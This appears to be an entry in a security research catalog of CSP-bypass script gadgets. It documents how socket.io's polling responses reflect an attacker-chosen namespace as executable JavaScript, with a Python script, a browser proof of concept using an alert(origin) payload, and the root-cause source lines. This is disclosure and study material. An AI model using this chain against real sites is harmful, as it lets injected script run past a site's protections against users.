---
description: Realtime application framework (Node.JS server)
github: socketio/socket.io
gadgets:
  Latest:
    authors:
      - twitter:j0r1an
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - script-tag
      - src-attr
      - wh-host-csp
      - any-timing
    pocs:
      - description: |
          The SocketIO client-server communication library has multiple modes is transporting data, one of which is "polling". In this mode, a long-lived request is sent that is only resolved when the server has a message to send to the client. These messages use [a custom protocol](https://socket.io/docs/v4/socket-io-protocol/) which happens to be valid JavaScript, allowing it to be used as a script gadget.

          *From an attacker's backend*, you need to first set up a new random session and send an invalid namespace request, to which the server will respond through another channel, reflecing your given namespace. You will craft a URL for this other channel containing the SocketIO session ID, which the victim will fetch by sending them to a dynamically generated payload. It will be valid for ~30 seconds.

          The following Python script generates a URL that responds with `alert(origin)` on the host when visited:

          ```python
          import requests
          import json

          HOST = "https://socketio.jtw.sh"

          # Request session ID
          r = requests.get(HOST + "/socket.io/", params={"EIO": 4, "transport": "polling"})
          sid = json.loads(r.text[1:])["sid"]
          # Send POST message
          r = requests.post(HOST + "/socket.io/", params={"EIO": 4, "transport": "polling", "sid": sid},
                            data="40/alert(origin),")
          # Craft URL for response
          url = f"/socket.io/?EIO=4&transport=polling&sid={sid}"
          print(url)  # eg. "/socket.io/?EIO=4&transport=polling&sid=gaMirGDfHcBJrIdUAAAD"
          ```

          The above can be implemented into a Flask server that stores the URL in an XSS payload and redirects the victim to it. The code below is an implementation in JavaScript that showcases the full chain.
        code: |
          <base href="https://socketio.jtw.sh">
          <script>
            (async () => {
              // Request session ID
              res = await fetch("/socket.io/?" + new URLSearchParams({ EIO: 4, transport: "polling" })).then(r => r.text());
              sid = JSON.parse(res.slice(1))["sid"];
              // Send POST message
              await fetch("/socket.io/?" + new URLSearchParams({ EIO: 4, transport: "polling", sid }), {
                method: "POST",
                body: "40/alert(origin),"
              });
              // Craft URL for response
              url = "/socket.io/?" + new URLSearchParams({ EIO: 4, transport: "polling", sid });
              console.log(url);  // eg. "/socket.io/?EIO=4&transport=polling&sid=gaMirGDfHcBJrIdUAAAD"
            
              // (loading script example for preview)
              const script = document.createElement("script");
              script.src = url;
              document.body.appendChild(script);
            })();
          </script>
          <!-- user input -->
          <script src="/socket.io/?EIO=4&transport=polling&sid=gaMirGDfHcBJrIdUAAAD"></script>
    more-info: |
      **Root Cause**
      
      Source: <a target="_blank" href="https://github.com/socketio/socket.io/blob/e95f6abf93766662cd3b341599ed312f4330213f/packages/socket.io/lib/client.ts#L137">https://github.com/socketio/socket.io/blob/e95f6abf93766662cd3b341599ed312f4330213f/packages/socket.io/lib/client.ts#L137</a>

      ```javascript
      this._packet({
        type: PacketType.CONNECT_ERROR,
        nsp: name,
        data: {
          message: "Invalid namespace",
        },
      });
      ```

      Source: <a target="_blank" href="https://github.com/socketio/socket.io/blob/e95f6abf93766662cd3b341599ed312f4330213f/packages/socket.io-parser/lib/index.ts#L101">https://github.com/socketio/socket.io/blob/e95f6abf93766662cd3b341599ed312f4330213f/packages/socket.io-parser/lib/index.ts#L101</a>

      ```javascript
      private encodeAsString(obj: Packet) {
        // first is type
        let str = "" + obj.type;

        // attachments if we have them
        if (
          obj.type === PacketType.BINARY_EVENT ||
          obj.type === PacketType.BINARY_ACK
        ) {
          str += obj.attachments + "-";
        }

        // if we have a namespace other than `/`
        // we append it followed by a comma `,`
        if (obj.nsp && "/" !== obj.nsp) {
          str += obj.nsp + ",";
        }

        // immediately followed by the id
        if (null != obj.id) {
          str += obj.id;
        }

        // json data
        if (null != obj.data) {
          str += JSON.stringify(obj.data, this.replacer);
        }

        debug("encoded %j as %s", obj, str);
        return str;
      }
      ```
    links:
      - https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/0725#csp-bypass-using-socket-io
      - https://socket.io/docs/v4/socket-io-protocol/
---
